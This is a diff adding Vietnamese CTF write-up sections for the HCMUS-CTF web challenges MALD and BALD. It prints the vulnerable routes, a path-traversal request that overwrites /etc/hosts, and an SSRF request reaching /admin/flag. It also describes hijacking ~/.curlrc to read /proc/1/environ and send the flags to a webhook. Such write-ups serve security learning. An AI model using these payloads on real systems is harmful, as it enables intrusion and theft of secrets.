@@ -290,3 +290,190 @@ Kết quả sau khi đăng nhập và truy cập vào trang `/user/Dat2Phit/edit
 ![Bypass Cache để lấy được flag](/img/2025/hcmus-ctf/web2-7.png)
 
 > Flag: `HCMUS-CTF{D1d_y0u_u53_B1n4ry_s34rcH?:v}`
+
+## Web/MALD
+
+### Description
+
+![Description](/img/2025/hcmus-ctf/des-web-mald.png)
+
+Đây là bài thứ 2 trong series web, và nó dùng chung source với bài Web/MAL.
+
+### Phân tích
+
+Ở bài này thì nhiệm vụ là cần phải truy cập vào được url `/admin/flag`. Tuy nhiên, route này chỉ chấp nhận được truy cập từ `localhost` mới trả về flag. => Bắt buộc phải SSRF ở đây rồi
+
+```javascript
+router.post('/admin/archive/:filename', isAdmin, async (req, res) => {
+  const filename = req.params.filename;
+  const content = req.body.content;
+  const file_path = path.join(archiveFolder, filename);
+  if (
+    file_path.includes('app') ||
+    file_path.includes('proc') ||
+    file_path.includes('environ') ||
+    isBinaryPath(file_path)
+  ) {
+    throw new Error('Invalid path');
+  }
+  if (!isAscii(content)) {
+    throw new Error('Content must be ASCII');
+  }
+  fs.writeFileSync(file_path, content);
+  res.redirect(`/admin/archive/${filename}`);
+});
+```
+
+Lúc này, mình chú ý đến đoạn code này. Nó sẽ cho phép người dùng admin (Dat2Phit mà mình đã lấy được từ challenge trước đó) để ghi nội dung vào một file nào đó. Ở đây, còn dính phải lỗi Path Traversal ở tham số `:filename` nên mình nghĩ đến việc tận dụng để ghi đè lại một file là `/etc/hosts`
+
+Câu hỏi đặt ra là mình phải ghi đè thành host nào đây. Thì khi đọc writeup của tác giả thì mình mới biết được là trong source có call đến một URL `http://api.jikan.moe/v4/producers` (Ngồi gần 30 tiếng rồi nên khúc này không nghĩ tới được @@)
+
+```javascript
+router.get('/studio/:producerId', async (req, res) => {
+  const mal_id = req.params.producerId;
+  let data;
+  if (myCache.has(`studio_${mal_id}`)) {
+    data = myCache.get(`studio_${mal_id}`);
+  } else {
+    // The libray hasn't implemented a wrapper for producers
+    const request = jakanMisc.infoRequestBuilder(
+      'http://api.jikan.moe/v4/producers',
+      mal_id,
+      'full'
+    );
+    data = await jakanMisc.makeRequest(normalizeUrl(request));
+    myCache.set(`studio_${mal_id}`, data);
+  }
+  res.render('producer/studio', {
+    data: data.data
+  });
+});
+```
+
+=> Vậy là chỉ cần ghi đè `api.jikan.moe` thành 127.0.0.1 để rồi khi call đến api trên thì sẽ gọi đến localhost và lấy được flag được lưu trong cache.
+
+Ở đây, còn có lỗi path traversal trong đoạn code dưới:
+
+```javascript
+const request = jakanMisc.infoRequestBuilder(
+      'http://api.jikan.moe/v4/producers',
+      mal_id,
+      'full'
+    );
+```
+
+```javascript
+infoRequestBuilder(
+    endpointBase: string,
+    id: number | string,
+    extraInfo?: string
+): string {
+    if (typeof extraInfo === "string") {
+        return `${endpointBase}/${id}/${extraInfo}`;
+    } else {
+        return `${endpointBase}/${id}`;
+    }
+}
+```
+
+Tham số truyền vào không được sanitize kỹ nên sẽ là nơi được tận dụng để tạo thành chain khai thác
+
+### PoC
+
+1. Intended:
+
+Đọc nội dung file /etc/hosts nhờ vào lỗi path traversal ở `/admin/archive/:filename`
+
+![Content of /etc/hosts](/img/2025/hcmus-ctf/etc-hosts.png)
+
+- Ghi thêm nội dung vào file `/etc/hosts`
+
+```txt
+POST /admin/archive/%2e%2e%2fetc%2fhosts HTTP/1.1
+...
+
+content=127.0.0.1%09localhost%0D%0A%3A%3A1%09localhost+ip6-localhost+ip6-loopback%0D%0Afe00%3A%3A%09ip6-localnet%0D%0Aff00%3A%3A%09ip6-mcastprefix%0D%0Aff02%3A%3A1%09ip6-allnodes%0D%0Aff02%3A%3A2%09ip6-allrouters%0D%0A172.19.0.3%09171089c0143d%0D%0Aapi.jikan.moe%09127.0.0.1
+```
+
+![Write to /etc/hosts](/img/2025/hcmus-ctf/write-file.png)
+
+![New /etc/hosts](/img/2025/hcmus-ctf/new-etc-hosts.png)
+
+- Khi ghi thành công vào `/etc/hosts`, tiếp tục đến việc tận dụng SSRF để đọc được flag ở `/admin/flag`
+
+`GET /studio/%2e%2e%2f%2e%2e%2fadmin%2fflag%23 HTTP/1.1`
+
+![SSRF](/img/2025/hcmus-ctf/result-web2.png)
+
+- Đến đây thì chỉ cần truy cập vào cache của admin `/admin/cache` là có thể xem được flag 2 rồi.
+
+![Get flag from cache](/img/2025/hcmus-ctf/flag2.png)
+
+> Flag: `HCMUS-CTF{Sh0uldnt_h4v3_1mpl3m3nt3d_1t}`
+
+2. Unintended:
+
+- Dùng `~/.curl` để ghi đè lại cấu hình của config của `curl` rồi đọc file `/proc/1/environ` là lấy được cả 3 flag của 3 bài web. (Wow, kiến thức mới)
+
+## Web/BALD
+
+### Description
+
+![Description](/img/2025/hcmus-ctf/des-web-bald.png)
+
+### PoC
+
+1. Mình dùng cách Unintended ở câu Web/MALD để solve luôn bài này được.
+
+Ghi đè nội dung file /root/.curlrc
+
+![Overwrite /root/.curlrc](/img/2025/hcmus-ctf/overwrite-curlrc.png)
+
+![Result](/img/2025/hcmus-ctf/res-overwrite-curlrc.png)
+
+Trong route `GET /user/:username/export` có sử dụng curl nên mình sẽ tận dụng nó để curl được gọi.
+
+```javascript
+// src\app\routes\user.js
+
+router.get('/user/:username/export', isLoggedIn, async (req, res) => {
+  const username = req.params.username;
+  const baseURL = `http://localhost:${process.env.PORT}`;
+  const data = await execFile('curl', [`${baseURL}/user/${username}/profile`]);
+  console.log(data);
+  const $ = cheerio.load(data.stdout);
+  const imgs = $('img:not(.user-avatar)')
+  console.log(`Found ${imgs.length} images`);
+  console.log(imgs);
+  const imgs_src = []
+  imgs.each(function (idx, img) {
+    imgs_src.push($(img).attr('src'))
+  });
+  console.log("Image sources:", imgs_src);
+  const promises = imgs_src.map((src) =>
+    execFile('curl', [src], { encoding: 'buffer', maxBuffer: 5 * 1024 * 1024 })
+  );
+  const results = await Promise.all(promises)
+  const img_buffers = await Promise.all(
+    results.map(async (res) => {
+      const img = await sharp(res.stdout).toFormat('png').toBuffer();
+      return img
+    }
+  ));
+  const outFile = `${exportsFilePath}/${uuidv4()}.pdf`;
+  const pdfBuffers = await imgToPDF(img_buffers, imgToPDF.sizes.A5).toArray()
+  fs.writeFileSync(outFile, Buffer.concat(pdfBuffers));
+  res.download(outFile, `${username}.pdf`, function (err) {
+    if (err) {
+      console.log(err);
+    }
+    fs.unlinkSync(outFile);
+  });
+});
+```
+
+Đến đây, chỉ cần truy cập vào `/user/DaT2PhIT/export` để curl được gọi và bùm, cả 3 flag sẽ được gửi qua webhook.
+
+![Boom](/img/2025/hcmus-ctf/unintended-flag.png)
+
+2. Cách Intended thì mình sẽ bổ sung sauu.
